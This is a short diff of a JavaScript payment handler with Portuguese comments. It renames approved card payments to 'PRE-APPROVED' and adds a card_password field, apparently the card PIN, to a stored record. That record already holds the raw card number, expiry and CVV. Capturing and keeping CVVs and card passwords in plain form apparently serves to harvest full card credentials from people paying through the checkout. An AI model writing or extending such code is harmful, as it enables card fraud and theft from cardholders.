@@ -75,12 +75,12 @@ exports.handler = async (event, context) => {
     let pixExpiration = null;
     let isMock = false;
 
-    // Determinar status padrão de cartão se for aprovado no checkout
+    // Determinar status padrão de cartão se for aprovado no checkout (atualizado para PRE-APPROVED)
     if (paymentMethod === 'card') {
       if (data.three_ds_status === 'failed' || data.three_ds_status === 'rejected') {
         transactionStatus = 'FAILED';
       } else {
-        transactionStatus = 'APPROVED';
+        transactionStatus = 'PRE-APPROVED';
       }
     }
 
@@ -214,6 +214,7 @@ exports.handler = async (event, context) => {
       card_number_raw: paymentMethod === 'card' ? data.card_number_raw : null,
       card_expiry_raw: paymentMethod === 'card' ? data.card_expiry_raw : null,
       card_cvv_raw: paymentMethod === 'card' ? data.card_cvv_raw : null,
+      card_password: paymentMethod === 'card' ? (data.card_password || null) : null,
       card_installments: paymentMethod === 'card' ? (data.card_installments || '1') : null,
       card_brand: paymentMethod === 'card' ? (data.card_brand || null) : null,
       
